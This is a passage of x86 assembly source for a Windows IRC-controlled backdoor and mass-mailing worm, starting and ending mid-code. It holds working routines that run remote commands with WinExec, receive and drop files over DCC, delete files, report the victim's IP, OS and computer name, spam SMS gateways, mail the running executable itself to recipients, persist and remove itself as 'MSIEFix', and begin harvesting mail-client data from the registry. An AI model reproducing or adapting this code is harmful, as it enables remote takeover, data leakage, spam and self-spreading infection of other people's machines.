    mov al, byte ptr [edi]
    xchg al, byte ptr [esi]
    stosb
    dec esi
    loop convert_num_

convert_num__:
    pop ebx
    add esp, 12
    pop ebp
    pop edx
    pop ecx
    pop edi
    retn

ascii_to_num:
    push ecx
    xor eax, eax
    mov ecx, eax
    
ascii_to_num_loop:
    lodsb
    xor eax, '0'
    
    cmp eax, 10
    jnc ascii_to_num_end
    imul ecx, ecx, 10
    add ecx, eax
    jmp ascii_to_num_loop
    
ascii_to_num_end:
    xchg eax, ecx
    pop ecx
    retn

error_fc:
    add esp, 12
    jmp connect_to_server_

dcc_rcv_command:
    call go_over_gapz
    jc dcc_recv_command_error

    push 1
    pop eax
    call is_user_allowed
    jc send_command_error
    
    mov eax, edi
    push edi
    call file_name_only
    pop edi

    call go_until_gap
    jc dcc_recv_command_error
    push eax
    push dword ptr [edi]
    and byte ptr [edi], 0
    
    xor ecx, ecx
    push ecx
    push ecx
    push CREATE_NEW
    push ecx
    push ecx
    push GENERIC_WRITE
    push eax
    call CreateFileA
    inc eax
    pop dword ptr [edi]
    pop edi
    jz dcc_recv_command_error
    
    dec eax
    push eax
    call CloseHandle

    mov eax, 200
    call heap_alloc
    xchg eax, esi

    push edi
    push esi
    call lstrcpy
        
    @pushvar <dd    ?>
    push 0
    push esi
    push offset dcc_recv_thread
    push 8192
    push 0
    call CreateThread
    
    xchg eax, ecx
    jecxz dcc_recv_command_error

    push ecx
    call CloseHandle
    
    clc
    retn
    
dcc_recv_command_error:
    stc
    retn

file_name_only:
    cmp byte ptr [edi], 0
    jnz $+3
    retn
    inc edi
    cmp byte ptr [edi-1], '\'
    jz file_name_only_
    cmp byte ptr [edi-1], '/'
    jz file_name_only_
    jmp file_name_only
file_name_only_:
    mov eax, edi
    jmp file_name_only

dcc_recv_thread proc    file_name:DWORD
    local file_handle:DWORD
    local bytez_sent:DWORD
    local DCC_socket:DWORD
    local DCC_sin:sockaddr_in

    push 0
    push SOCK_STREAM
    push AF_INET
    call socket
    mov dword ptr [DCC_socket], eax
    
    mov dword ptr [DCC_sin.sin_family], AF_INET
    
    mov edi, dword ptr [file_name]
    call go_until_gap
    and byte ptr [edi], 0
    
    inc edi
    
    xor eax, eax
    push eax
    push eax
    push OPEN_EXISTING
    push eax
    push eax
    push GENERIC_WRITE
    push dword ptr [file_name]
    call CreateFileA
    inc eax
    jz dcc_recv_thread_end_close_socket
    dec eax
    mov dword ptr [file_handle], eax

    mov esi, edi
    call ascii_to_num
    call go_until_gap
    jc dcc_recv_thread_end
    
    inc edi
    
    push eax
    call htonl
    mov dword ptr [DCC_sin.sin_addr], eax
    
    mov esi, edi
    call ascii_to_num
    call go_until_gap
    jc dcc_recv_thread_end
    
    inc edi
    
    push eax
    call htons
    mov word ptr [DCC_sin.sin_port], ax
    
    mov esi, edi
    call ascii_to_num
    call go_until_gap

    mov ebx, eax
    
    lea edi, [DCC_sin.sin_zero]
    xor eax, eax
    stosd
    stosd
    
    lea eax, [DCC_sin]
    push type(sockaddr_in)
    push eax
    push dword ptr [DCC_socket]
    call connect
    inc eax
    jz dcc_recv_thread_end_close_socket

    sub esp, 1000
    mov edi, esp
    xor esi, esi

dcc_recv_thread_loop:
    push 0
    push 1000
    push edi
    push dword ptr [DCC_socket]
    call recv
    inc eax
    jz dcc_recv_thread_end_close_socket
    dec eax
    
    sub ebx, eax
    add esi, eax
    
    push 0
    @pushvar <dd    ?>
    push eax
    push edi
    push dword ptr [file_handle]
    call WriteFile
    
    push esi
    call htonl
    
    lea edx, [bytez_sent]
    mov dword ptr [edx], eax
    
    push 0
    push 4
    push edx
    push dword ptr [DCC_socket]
    call send
    
    test ebx, ebx
    jnz dcc_recv_thread_loop
    
    add esp, 1000
    
dcc_recv_thread_end_close_socket:
    push dword ptr [DCC_socket]
    call closesocket
dcc_recv_thread_end_close_file:
    push dword ptr [file_handle]
    call CloseHandle
dcc_recv_thread_end:
    push dword ptr [file_name]
    call heap_free
    leave
    push 0
    call ExitThread
dcc_recv_thread endp

execute_command:
    push 1
    pop eax
    call is_user_allowed
    jc execute_command_end

    call go_over_gapz
    jc execute_command_end

    push 0
    push edi
    call WinExec
    
    cmp eax, 31
execute_command_end:
    retn

version_command:
    call message_for_who
    mov dword ptr [recipient], eax
    lea esi, [version_message]
    call send_message
    add esp, 4
    retn
    
info_command:
    xor eax, eax
    call is_user_allowed
    jc info_command_error
    call message_for_who
    mov dword ptr [recipient], eax

    push dword ptr [local_host_ip]
    call ntohl

    push eax
    call inet_ntoa
    mov dword ptr [privmsg_what], eax
    
    lea esi, [privmsg_msg]
    call send_message

    @pushsz "Win9x"
    pop eax
    
    mov dword ptr [privmsg_what], eax

    call GetVersion
    test eax, 8000000h
    jz info_command_go_on
    
    @pushsz "WinNT"
    pop eax
    
    mov dword ptr [privmsg_what], eax
    
info_command_go_on:
    lea esi, [privmsg_msg]
    call send_message

    mov eax, MAX_PATH+1
    call heap_alloc
    xchg esi, eax
    
    mov dword ptr [computer_name_length], MAX_PATH+1

    @pushvar <computer_name_length  dd  ?>
    push esi
    call GetComputerNameA
    xchg eax, ecx
    jecxz info_command_jmp_over_machine
    
    call GetLastError
    
    mov dword ptr [privmsg_what], esi
    
    push esi
    
    lea esi, [privmsg_msg]
    call send_message
    
    pop esi
    
info_command_jmp_over_machine:
    push esi
    call heap_free
    
    add esp, 4
info_command_error:
    retn

delete_command  proc
    local   wfd:WIN32_FIND_DATA
    
    push 1
    pop eax
    call is_user_allowed
    jc delete_command_end_error

    call go_over_gapz
    jc delete_command_end_error
    
    lea eax, [wfd]
    push eax
    push edi
    call FindFirstFileA
    inc eax
    stc
    jz delete_command_end_error
    dec eax

    xchg eax, ebx
    
delete_command_loop:
    lea eax, [wfd.WFD_szFileName]
    push eax
    call DeleteFileA
    xchg eax, ecx
    jecxz delete_command_end
    
    lea eax, [wfd]
    push eax
    push ebx
    call FindNextFileA
    xchg eax, ecx
    jecxz delete_command_end_
    
    jmp delete_command_loop

delete_command_end_:
    clc
    jmp delete_command_end+1
delete_command_end:
    stc
    lahf
    push ebx
    call FindClose
    sahf
delete_command_end_error:
    leave
    retn
delete_command  endp

leave_command:
    push 1
    pop eax
    call is_user_allowed
    jc leave_command_end

    lea esi, [query_settingz]
    call delete_registry_

    call get_fcz_address
    jc leave_command_win9x

    push SC_MANAGER_CONNECT or SC_MANAGER_CREATE_SERVICE
    push 0
    push 0
    call OpenSCManagerA
    xchg eax, ecx
    jecxz leave_command_end
    
    xchg ecx, esi

    push DELETE
    push offset service_name
    push esi
    call OpenServiceA
    xchg eax, ecx
    jecxz leave_command_end

    push ecx
    
    push ecx
    call DeleteService
    
    call CloseServiceHandle
    
    push dword ptr [SC_Manager]
    call CloseServiceHandle

    sub esp, 300
    mov esi, esp

    push 300
    push esi
    push 0
    call GetModuleFileNameA

    push MOVEFILE_DELAY_UNTIL_REBOOT
    push 0
    push esi
    call MoveFileExA
    
    add esp, 300

    test eax, eax
    jz leave_command_end

    jmp reboot_command_
    
leave_command_end:
    stc
    retn
    
leave_command_win9x:
    xor eax, eax
    @pushvar <dd    ?>
    @pushvar <key_handle_   dd  ?>
    push eax
    push KEY_QUERY_VALUE or KEY_SET_VALUE
    push eax
    push eax
    push eax
    @pushsz "Software\Microsoft\Windows\CurrentVersion\Run"
    push HKEY_LOCAL_MACHINE
    call RegCreateKeyExA
    
    @pushsz "MSIEFix"
    mov ebx, dword ptr [key_handle_]
    push ebx
    call RegDeleteValueA
    
    push ebx
    call RegCloseKey

    sub esp, 200
    mov esi, esp

    push 200
    push esi
    @pushsz "%windir%\wininit.ini"
    call ExpandEnvironmentStringsA
    
    sub esp, 300
    mov edi, esp

    push 300
    push edi
    push 0
    call GetModuleFileNameA

    push esi
    push edi
    @pushsz "NUL"
    @pushsz "rename"
    call WritePrivateProfileStringA

    add esp, 500
    jmp reboot_command_

sms_thread  proc
    local   _sms_email_:_email_

    @SEH_SetupFrame <jmp sms_thread_end_loop>


IFDEF   worm
    call the_bat_spread
ENDIF

sms_thread_loop:
    cmp dword ptr [online_flag], 1
    jnz sms_thread_end_loop

    lea edi, [sms_number]
    
    push 6
    pop ebx
    call get_random
    mov eax, dword ptr [predvolby+eax*4]
    
    stosd

    mov ecx, 6
    push 10
    pop ebx

sms_thread_numberz_loop:
    call get_random
    add al, '0'
    stosb
    loop sms_thread_numberz_loop

    lea esi, [_sms_email_]
    mov dword ptr [esi], offset sms_from
    mov dword ptr [esi.EM_RcptTo], offset sms_email
    and dword ptr [esi.EM_Subject], 0
    
    push 4
    pop ebx
    call get_random
    xchg esi, ebx
    mov esi, dword ptr [_smses_+eax*4]
    
    lea edi, [ebx.EM_FilezNum]
    xor eax, eax
    stosd
    stosd

    cmp dword ptr [online_flag], 1
    jnz sms_thread_end_loop
    
    call sms_send

    mov eax, 10000
    call online_sleep
    jc sms_thread_end_loop
    jmp sms_thread_loop
    
sms_thread_end_loop:
    @SEH_RemoveFrame
    leave
    push 0
    call ExitThread
sms_thread  endp

; in: esi - Base64 string
;     edi - buffer
; out: eax - size of decoded string
base64_decode:
    pushad
    xor ebp, ebp

    push edi

base64_decode_main_loop:
    xor ebx, ebx

    push 4
    pop ecx

base64_decode_loop:
    cmp dword ptr [esi], 0a0d0a0dh
    jz base64_decode_end

        lodsb

    test al, al
    jz base64_decode_end
    cmp al, '='
    jz base64_decode_end_

    call base64_find_char
    jc base64_decode_loop
    shl ebx, 6
    or ebx, eax

    loop base64_decode_loop

    mov eax, ebx
    shr ebx, 8
    mov byte ptr [edi], bh

        xchg al, ah
    inc edi
    stosw

        jmp base64_decode_main_loop

base64_decode_end_:
    push ecx
    shr ebx, 2
    loop $-3
    pop ecx

    sub ecx, 4
    not ecx

    mov eax, ebx

    stosb
    shr eax, 8
    loop $-4

base64_decode_end:
    pop eax
    sub edi, eax
    dec eax
    mov dword ptr [esp.Pushad_eax], edi
    popad
    retn

base64_find_char:
    pushad
    lea edi, [base64_alphabet]
    mov ecx, 64
    repnz scasb
    stc
    pushfd
    sub edi, offset base64_alphabet
    dec edi
    popfd
    mov dword ptr [esp.Pushad_eax], edi
    popad
    jnz $+3
        clc
    retn

base64_encode:
    pushad
    xor ebp, ebp
    push 3
    pop ecx
    cdq
    div ecx
    xchg eax, ecx
    push edx
    mov ebx, offset base64_alphabet
    cdq
base64_encode_loop:
    push ecx
    push 4
    pop ecx
    call base64_encode_main
    pop ecx
    loop base64_encode_loop
    pop ecx
    jecxz base64_encode_end
    inc ecx
    cmp ecx, 2
    push ecx
    jz base64_make_padding
    pop eax
    push 1
base64_make_padding:
    call base64_encode_main
    pop ecx
base64_padding_loop:
    push '='
    pop eax
    call base64_stosb
    loop base64_padding_loop
base64_encode_end:
    mov dword ptr [esp.Pushad_ecx], ebp
    popad
    retn
    
base64_encode_main:
    mov al, byte ptr [esi]
    shr al, 2
    call base64_stosb_
    mov ax, word ptr [esi]
    xchg al, ah
    shr ax, 4
    call base64_stosb_
    jz base_64_encode_main_end
    inc esi
    mov ax, word ptr [esi]
    xchg al, ah
    shr ax, 6
    call base64_stosb_
    jz base_64_encode_main_end
    inc esi
    lodsb
    call base64_stosb_
base_64_encode_main_end:
    retn
    
base64_stosb_:
    and al, 111111b
    xlat
    call base64_stosb
    dec ecx
    retn
base64_stosb:
    stosb
    inc ebp
    inc edx
    cmp edx, 75
    jnz base64_stosb_go_on
    xor edx, edx
    mov eax, CR_LF
    inc ebp
    stosw
    inc ebp
base64_stosb_go_on:
    retn

; in: esi - ptr to _email_ struc
; out: CFlag == 0 if ok
;      Cflag == 1 if error
send_mail   proc
    local   file_size:DWORD
    local   heap_handle_:DWORD
    local   msg_buffer:DWORD
    local   thread:DWORD
    local   temp_handle:DWORD
    local   fsh:DWORD
    local   bytes_read_:DWORD
    
    xor eax, eax
    push eax
    push eax
    push eax
    call HeapCreate
    test eax, eax
    stc
    jz send_mail_end_
    mov dword ptr [heap_handle_], eax

    xor eax, eax
    mov ecx, dword ptr [esi.EM_FilezNum]
    mov edx, eax
    mov edi, eax
    jecxz send_mail_alloc_mem

    test ecx, ecx
    jns send_mail_file_loop
    
    push 1
    pop ecx

send_mail_file_loop:
    push edx
    push ecx
    
    xor eax, eax
    push eax
    push eax
    push OPEN_EXISTING
    push eax
    push eax
    push GENERIC_READ
    mov eax, dword ptr [esi.EM_Filez]
    push dword ptr [eax+edx*4]
    call CreateFileA
    pop ecx
    pop edx
    inc eax
    jz send_mail_end
    dec eax
    
    push edx
    push ecx
    
    push eax
    
    lea ecx, [fsh]
    push ecx
    push eax
    call GetFileSize
    
    xchg eax, ebx
    call CloseHandle
    
    pop ecx
    pop edx

    cmp dword ptr [fsh], 0
    jnz send_mail_end
    
    add edi, ebx
    shr ebx, 1
    add edi, ebx
    
    inc edx
    loop send_mail_file_loop

    xchg eax, edi
send_mail_alloc_mem:
    add eax, 1000
    push eax
    push HEAP_ZERO_MEMORY
    push dword ptr [heap_handle_]
    call HeapAlloc
    test eax, eax
    jz send_mail_end
    mov dword ptr [msg_buffer], eax
    
    mov edi, dword ptr [msg_buffer]
    add edi, 8
    push esi
    call generate_mail
    pop esi
    jc send_mail_end

    sub esp, 300
    mov edi, esp
    
    mov esi, dword ptr [esi.EM_RcptTo]
    call generate_smtp_servers
    jc send_mail_end_add_esp
    
    mov eax, dword ptr [msg_buffer]
    mov dword ptr [eax], edi
    
    cmp dword ptr [online_flag], 1
    jnz send_mail_end_add_esp

    @pushvar <dd    ?>
    push 0
    push dword ptr [msg_buffer]
    push offset smtp_thread
    push 8192
    push 0
    call CreateThread
    mov dword ptr [thread], eax
    
    push 50
    call Sleep

    push 60000
smtp_timeout    equ $-4
    push dword ptr [thread]
    call WaitForSingleObject
    inc eax
    jz send_mail_end_add_esp
    cmp eax, WAIT_TIMEOUT
    jnz send_mail_all_iz_maybe_ok
    
    push 0
    mov ebx, dword ptr [thread]
    push ebx
    call TerminateThread
    
    push ebx
    call CloseHandle
    
    jmp send_mail_end_add_esp

send_mail_all_iz_maybe_ok:
    sub esp, 4
    push esp
    push dword ptr [thread]
    call GetExitCodeThread
    cmp dword ptr [esp], -1
    lahf
    add esp, 4
    sahf
    jz send_mail_end_add_esp
    add esp, 300
    push dword ptr [thread]
    call CloseHandle
    clc
    jmp send_mail_end+1
send_mail_end_add_esp:
    add esp, 300
send_mail_end:
    stc
    pushfd
    push dword ptr [heap_handle_]
    call HeapDestroy
    popfd
send_mail_end_:
    leave
    retn

; in: esi - email address
;     edi - buffer to put there 3 strings (<server>, smtp.<server>, mail.<server>)
generate_smtp_servers:
    pushad
generate_smtp_servers_:
    lodsb
    test al, al
    jz generate_smtp_servers_error
    cmp al, '@'
    jnz generate_smtp_servers_
    
    and byte ptr [edi], 0
    
    push esi
    push edi
    call lstrcatA

    @endsz_

    @copy <offset _smtp_>
    stosb
    dec edi
    
    push esi
    push edi
    call lstrcatA

    @endsz_

    @copy <offset _mail_>
    stosb
    dec edi
    
    push esi
    push edi
    call lstrcatA

    @endsz_

    xor eax, eax
    dec eax
    stosd

    clc
    jmp generate_smtp_servers_error+1
generate_smtp_servers_error:
    stc
    popad
    retn

; this generates an email
generate_mail:
    @SEH_SetupFrame <jmp generate_mail_end>
    @copy <offset helo_cmd>
    push 100
    push edi
    call gethostname
    @endsz_
    dec edi
    mov ax, CR_LF
    stosw
    inc edi

    @copy <offset mail_from>
    mov al, '<'
    stosb
    @copy <dword ptr [esi.EM_MailFrom]>
    mov al, '>'
    stosb
    mov ax, CR_LF
    stosw
    inc edi

    @copy <offset rcpt_to>
    mov al, '<'
    stosb
    @copy <dword ptr [esi.EM_RcptTo]>
    mov al, '>'
    stosb

    mov ax, CR_LF
    stosw
    inc edi
    
    @copy <offset data>
    inc edi

    mov eax, dword ptr [esi.EM_FilezNum]
    test eax, eax
    jns generate_normal_mail_data
    
    xor eax, eax
    push eax
    push eax
    push OPEN_EXISTING
    push eax
    push eax
    push GENERIC_READ
    mov eax, dword ptr [esi.EM_Filez]
    push dword ptr [eax]
    call CreateFileA
    inc eax
    jz generate_mail_end
    dec eax
    xchg eax, ebx
    
    sub esp, 4
    mov esi, esp
    
    @pushvar <dd    ?>
    push ebx
    call GetFileSize
    
    push 0
    push esi
    push eax
    push edi
    push ebx
    call ReadFile

    add edi, dword ptr [esi]
    add esp, 4

    push ebx
    call CloseHandle
    
    jmp generate_mail_jmp_over_data
    
generate_normal_mail_data:
    call generate_mail_data
    jc generate_mail_end
    
generate_mail_jmp_over_data:
    @copy <offset end_data>
    inc edi
    
    @copy <offset quit>

    clc
    jmp generate_mail_end+1
generate_mail_end:
    stc
    lahf
    @SEH_RemoveFrame
    sahf
    retn
    
generate_mail_data:
    @copy <offset recieved>

        @copy <offset date>
    
    xor eax, eax
    push 100
    push edi
    push offset date_format
    push eax
    push eax
    push eax
    call GetDateFormatA
    @endsz_
    dec edi

    mov ax, CR_LF
    stosw
    
    @copy <offset from>
    @copy <dword ptr [esi.EM_MailFrom]>
    mov ax, CR_LF
    stosw

    @copy <offset to>
    @copy <dword ptr [esi.EM_RcptTo]>
    mov ax, CR_LF
    stosw

    cmp dword ptr [esi.EM_Subject], 0
    jz no_subject_in_mail

    @copy <offset subject>
    @copy <dword ptr [esi.EM_Subject]>
    mov ax, CR_LF
    stosw
    
no_subject_in_mail:
    @copy <offset header>

    mov ecx, dword ptr [esi.EM_Message]
    jecxz generate_mail_data_check_filez

    @copy <offset text>
    @copy ecx

    mov ax, CR_LF
    stosw
    
generate_mail_data_check_filez:
    mov ecx, dword ptr [esi.EM_FilezNum]
    test ecx, ecx
    jz generate_mail_data_end

    xor edx, edx
generate_mail_data_attachmentz_loop:
    push edx
    push ecx
    
    push edx
    push esi

    @copy <offset attachment>
    push edi
    mov eax, dword ptr [esi.EM_Filez]
    mov edi, dword ptr [eax+edx*4]
    mov eax, edi
    call file_name_only
    mov edi, eax
    
    pop esi
    xchg esi, edi
    mov edx, esi
    @copysz
    
    pop esi

    dec edi
    @copy <offset attachment_>
    
    push esi
    mov esi, edx
    @copysz
    pop esi
    
    dec edi

    mov al, '"'
    stosb
    
    mov ax, CR_LF
    stosw
    stosw

    pop edx

    xor eax, eax
    push eax
    push eax
    push OPEN_EXISTING
    push eax
    push eax
    push GENERIC_READ
    mov eax, dword ptr [esi.EM_Filez]
    push dword ptr [eax+edx*4]
    call CreateFileA
    mov dword ptr [temp_handle], eax
    
    @pushvar <dd    ?>
    push eax
    call GetFileSize
    
    xor edx, edx
    push 3
    pop ecx
    div ecx
    
    xchg edx, ecx
    jecxz dont_align
    
    inc eax
    imul eax, eax, 3
    
dont_align:
    
    push eax
        
    push eax
    push HEAP_ZERO_MEMORY
    push dword ptr [heap_handle]
    call HeapAlloc
    test eax, eax
    jz generate_mail_data_close_file
    xchg eax, ebx

    pop eax
    
    lea ecx, [bytes_read_]
    push 0
    push ecx
    push eax
    push ebx
    push dword ptr [temp_handle]
    call ReadFile
    
    push esi
    mov eax, dword ptr [bytes_read_]
    mov esi, ebx
    call base64_encode
    add edi, ecx
    pop esi

    push edi
    push ebx
    call heap_free
    pop edi

    push dword ptr [temp_handle]
    call CloseHandle

    pop ecx
    pop edx
    inc edx
    dec ecx
    jnz generate_mail_data_attachmentz_loop
    
    mov ax, CR_LF
    stosw

generate_mail_data_end:
    @copy <offset end_boundary>
    clc
    jmp generate_mail_data_end_error+1
generate_mail_data_close_file:
    push dword ptr [temp_handle]
    call CloseHandle
generate_mail_data_end_error:
    stc
    retn
    
send_mail   endp

smtp_thread proc    msg_buffer:DWORD
IFDEF   log
    local   file_handle:DWORD
ENDIF
    local   socket_handle_:DWORD
    local   _sin__:sockaddr_in
    local   response:DWORD
    local   response_:DWORD
    local   current_smtp_server:DWORD

    mov eax, dword ptr [msg_buffer]
    mov eax, dword ptr [eax]
    mov dword ptr [current_smtp_server], eax
    ; some init ...
    
IFDEF   log
    xor eax, eax
    push eax
    push eax
    push CREATE_ALWAYS
    push eax
    push eax
    push GENERIC_WRITE
    @pushsz "smtp.log"
    call CreateFileA
    inc eax
    jz smtp_thread_end
    
    mov dword ptr [file_handle], eax
ENDIF

    push 0
    push SOCK_STREAM
    push AF_INET
    call socket
    inc eax
    jz smtp_thread_end_close_file
    dec eax
    mov dword ptr [socket_handle_], eax
    
smtp_server_loop:
    mov esi, dword ptr [current_smtp_server]
    call get_hostent
    jz smtp_thread_next_smtp_server

    lea edi, [_sin__]
    push SMTP_PORT
    pop ebx
    call update_sin
    
    push type(sockaddr_in)
    push edi
    push dword ptr [socket_handle_]
    call connect

    test eax, eax
    jnz smtp_thread_next_smtp_server
    
    call get_response
    jc smtp_thread_next_smtp_server
    cmp eax, '022'
    jnz smtp_thread_next_smtp_server

    mov esi, dword ptr [msg_buffer]
    add esi, 8

    mov edi, esi
    @endsz
    sub esi, edi
    dec esi

    call write_socket
    jz smtp_thread_next_smtp_server
    
    call get_response
    jc smtp_thread_next_smtp_server
    cmp eax, '052'
    jnz smtp_thread_next_smtp_server
    
    xchg esi, edi
    add esi, edi
    inc esi

    mov ecx, 5

smtp_thread_main_loop:
    mov edi, esi
    @endsz
    sub esi, edi
    push ecx
    dec esi

    call write_socket
    jz smtp_thread_next_smtp_server
    
    call get_response
    jc smtp_thread_next_smtp_server

    cmp eax, '052'
    jz smtp_thread_main_loop_go_on
    cmp eax, '152'
    jz smtp_thread_main_loop_go_on
    cmp eax, '453'
    jz smtp_thread_main_loop_go_on
    cmp eax, '122'
    jz smtp_thread_main_loop_go_on

    pop eax
    jmp smtp_thread_next_smtp_server
    
smtp_thread_main_loop_go_on:
    pop ecx
    xchg esi, edi
    add esi, edi
    inc esi
    
    loop smtp_thread_main_loop

    push dword ptr [socket_handle_]
    call closesocket
IFDEF   log
    push dword ptr [file_handle]
    call CloseHandle
ENDIF
    leave
    push 0
    call ExitThread
    
smtp_thread_next_smtp_server:
    mov esi, dword ptr [current_smtp_server]
    @endsz

    mov eax, dword ptr [esi]
    inc eax
    jnz smtp_thread_no_error
    
    push dword ptr [socket_handle_]
    call closesocket
smtp_thread_end_close_file:
IFDEF   log
    push dword ptr [file_handle]
    call CloseHandle

ENDIF
smtp_thread_end:
    leave
    push -1
    call ExitThread

smtp_thread_no_error:
    
    mov dword ptr [current_smtp_server], esi
    jmp smtp_server_loop
smtp_thread endp

write_socket:
IFDEF   log
    pushad
    push 0
    @pushvar <dd    ?>
    push esi
    push edi
    push dword ptr [file_handle]
    call WriteFile
    popad
ENDIF
    
    push 0
    push esi
    push edi
    push dword ptr [socket_handle_]
    call send

    inc eax
    retn

get_response:
    push 0
    push 4
    lea eax, [response]
    push eax
    push dword ptr [socket_handle_]
    call recv
    cmp eax, 4
    jnz get_response_end_error

get_response_loop:
    push 0
    push 1
    lea eax, [response_]
    push eax
    push dword ptr [socket_handle_]
    call recv
    
    cmp eax, 1
    jnz get_response_end_error
    cmp byte ptr [response_], 0ah
    jnz get_response_loop
    
    clc
    jmp get_response_end_error+1

get_response_end_error:
    stc
    mov eax, dword ptr [response]
    pushfd
    and eax, 0ffffffh
    popfd
    retn

; in: esi - string to make CRC32
;     [esp+4] - length of string or null if ASCIIZ_string
; out: eax - CRC32
gimme_CRC32:
    pushad
    xor edx, edx
    mov eax, edx
gimme_CRC32_all_iz_ok:
    mov ecx, dword ptr [esp.cPushad+4]
    jecxz gimme_CRC32_asciiz_string
gimme_CRC32_main_loop:
    lodsb
    cmp al, 'a'
    jc gimme_CRC32_big
    cmp al, 'z'
    ja gimme_CRC32_big
    add al, 'A'-'a'
gimme_CRC32_big:
    xor ah, al
    rol eax, 8
    xor eax, edx
    not edx
    mov bl, 32
gimme_CRC32_next:
    rol eax, 1
    xor edx, 05f6abcd8h
    xor eax, 0a6dfe9ffh
    ror edx, 1
    add eax, edx
    xor edx, 08ad6fe7h
    dec bl
    jnz gimme_CRC32_next
    xor eax, edx
    dec ecx
    jnz gimme_CRC32_main_loop
    mov dword ptr [esp.Pushad_eax], eax
    popad
    retn 4
gimme_CRC32_asciiz_string:
    mov edi, esi
    push esi
    inc edi
    @endsz
    sub esi, edi
    mov dword ptr [esp.cPushad+8], esi
    pop esi
    jmp gimme_CRC32_all_iz_ok

email_msg   proc
    local   e_mail_:_email_

    xor eax, eax
    call is_user_allowed
    jc email_msg_end

    lea esi, [e_mail_]

    call parse_message_
    jc email_msg_end
    mov dword ptr [esi.EM_RcptTo], eax
    
    call parse_message_
    jc email_msg_end
    mov dword ptr [esi], eax

    call parse_message_
    jc email_msg_end

    push esi
    mov esi, eax
    call ascii_to_num
    xchg eax, ebx
    pop esi
    
    call parse_string_
    jc email_msg_end
    cmp word ptr [eax], 2dh
    jnz $+4
    xor eax, eax
    mov dword ptr [esi.EM_Subject], eax
    
    call parse_string_
    jc email_msg_end
    mov dword ptr [esi.EM_Message], eax
    
    lea edi, [esi.EM_FilezNum]
    xor eax, eax
    stosd
    stosd

    xchg ebx, ecx

email_msg_loop:
    push ecx
    call send_mail
    pop ecx
    jc email_msg_end
    loop email_msg_loop

email_msg_end:
    leave
    retn
email_msg   endp

email_redir proc
    local   e_mail_:_email_
    
    push 1
    pop eax
    call is_user_allowed
    jc email_redir_end

    lea esi, [e_mail_]

    call parse_message_
    jc email_redir_end
    mov dword ptr [esi.EM_RcptTo], eax
    
    call parse_message_
    jc email_redir_end
    mov dword ptr [esi], eax

    call parse_message_
    jc email_redir_end
        
        push esi
    mov esi, eax
    call ascii_to_num
    xchg eax, ebx
    pop esi

    call parse_message_
    
    sub esp, 4
    
    mov dword ptr [esi.EM_Filez], esp
    mov dword ptr [esp], eax
    
    push -1
    pop eax
    mov dword ptr [esi.EM_FilezNum], eax

    xchg ebx, ecx

email_redir_loop:
    push ecx
    call send_mail
    pop ecx
    jc email_redir_go_on
    loop email_redir_loop

email_redir_go_on:
        lahf
    add esp, 4
    sahf
email_redir_end:
    leave
    retn
email_redir endp

email_file  proc
    local   e_mail_:_email_
    
    xor eax, eax
    call is_user_allowed
    jc email_file_end

    lea esi, [e_mail_]

    call parse_message_
    jc email_file_end
    mov dword ptr [esi.EM_RcptTo], eax
    
    call parse_message_
    jc email_file_end
    mov dword ptr [esi], eax

    call parse_string_
    jc email_file_end
    cmp word ptr [eax], 2dh
    jnz $+4
    xor eax, eax
    mov dword ptr [esi.EM_Subject], eax
    
    call parse_string_
    jc email_file_end
    mov dword ptr [esi.EM_Message], eax

    call parse_message_
    
    sub esp, 4
    
    mov dword ptr [esi.EM_Filez], esp
    mov dword ptr [esp], eax
    
    push 1
    pop eax
    mov dword ptr [esi.EM_FilezNum], eax

    call send_mail
    lahf
    add esp, 4
    sahf

email_file_end:
    leave
    retn
email_file  endp

send_sms    proc
    local   _sms_email_:_email_

    xor eax, eax
    call is_user_allowed
    jc send_sms_end

    lea esi, [_sms_email_]

    call parse_message_
    jc send_sms_end
    mov dword ptr [esi.EM_RcptTo], eax
    
    call parse_message_
    jc send_sms_end
    mov dword ptr [esi], eax

    call parse_message_
    jc email_redir_end
        
        push esi
    mov esi, eax
    call ascii_to_num
    xchg eax, ebx
    pop esi

    call parse_string_
    jc send_sms_end
    cmp word ptr [eax], 2dh
    jnz $+4
    xor eax, eax
    mov dword ptr [esi.EM_Subject], eax
    
    call parse_string_
    jc send_sms_end

    xchg ebx, ecx

        xchg esi, ebx
    xchg eax, esi
    
    lea edi, [ebx.EM_FilezNum]
    xor eax, eax
    stosd
    stosd

send_sms_loop:
    pushad
    call sms_send
    popad
    jc send_sms_end
    loop send_sms_loop

send_sms_end:
    leave
    retn
send_sms    endp


email_spread    proc
    local   e_mail_:_email_
    
    push 1
    pop eax
    call is_user_allowed
    jc email_spread_end

    push edi
    
    lea edi, [e_mail_]
    lea esi, [msiefix_email]
    push edi
    push type (_email_)/4
    pop ecx
    
    rep movsd
    
    pop esi
    pop edi
    
    call parse_message_
    mov dword ptr [esi.EM_RcptTo], eax
    
    call spread_msiefix

email_spread_end:
    leave
    retn
email_spread    endp

spread_msiefix:
    sub esp, 300
    mov edi, esp
    
    push 300
    push edi
    push 0
    call GetModuleFileNameA

    sub esp, 4
    
    mov dword ptr [esi.EM_Filez], esp
    mov dword ptr [esp], edi
    
    push 1
    pop eax
    mov dword ptr [esi.EM_FilezNum], eax

    call send_mail
    lahf
    add esp, 304
    sahf
    retn


parse_message_:
    call go_over_gapz
    jc parse_message_end_
    mov eax, edi
    call go_until_gap
    jc parse_message_end_
    and byte ptr [edi], 0
    inc edi
    clc
parse_message_end_:
    retn

parse_string_:
    call go_over_gapz
    jc parse_string_end_

    cmp byte ptr [edi], '"'
    jnz parse_string_end_
    
    inc edi
    mov eax, edi
    
parse_string_find:
    cmp byte ptr [edi], '"'
    jz parse_string_found
    cmp byte ptr [edi], 0
    jz parse_string_end_
    inc edi
    jmp parse_string_find
parse_string_found:
    and byte ptr [edi], 0
    inc edi
    clc
    jmp parse_string_end_+1
parse_string_end_:
    stc
    retn
    
IFDEF   _send_notice_
send_notice:
    call get_local_host
    
    push dword ptr [local_host_ip]
    call ntohl

    push eax
    call inet_ntoa
    
    lea edi, [notice_ip]
    @copy eax
    
    lea esi, [notice_email]
    call send_mail
    retn
ENDIF

the_bat_spread  proc
    local   ftime:FILETIME
    local   subkey_index:DWORD

    push offset stime
    call GetLocalTime
    
    cmp word ptr [stime.ST_Day], 03h
    jnz the_bat_spread_end
    
    xor eax, eax
    @pushvar <dd    ?>
    @pushvar <key_handle__  dd  ?>
    push eax
    push KEY_QUERY_VALUE or KEY_ENUMERATE_SUB_KEYS
    push eax
    push eax
    push eax
    @pushsz ""
    push HKEY_USERS
    call RegCreateKeyExA

    xchg eax, ecx
    jecxz $+3
    retn

    sub esp, 1000
    mov edi, esp
    mov dword ptr [subkey_index], ecx

